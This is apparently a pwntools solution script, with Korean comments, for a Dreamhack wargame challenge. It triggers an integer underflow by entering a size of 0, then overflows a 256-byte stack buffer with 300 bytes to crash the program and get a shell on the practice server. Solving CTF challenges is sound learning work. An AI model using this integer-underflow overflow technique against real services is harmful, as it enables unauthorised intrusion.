from pwn import *

# 로컬에서 테스트할 경우
# p = process('./sint') 

# 워게임 서버에 연결할 경우 (IP와 PORT를 문제 정보에 맞게 수정하세요)
p = remote('host1.dreamhack.games', 21501)

# 1. Size에 0을 입력하여 integer underflow 유발
p.sendlineafter(b"Size: ", b"0")

# 2. 버퍼 크기(256) + SFP(4) + RET(4) = 264바이트 이상 입력하여 스택 덮어쓰기
# 여유 있게 300바이트의 'A'를 보내서 프로그램을 크래시 냄
payload = b"A" * 300
p.sendafter(b"Data: ", payload)

# 3. 쉘 획득 후 상호작용
p.interactive()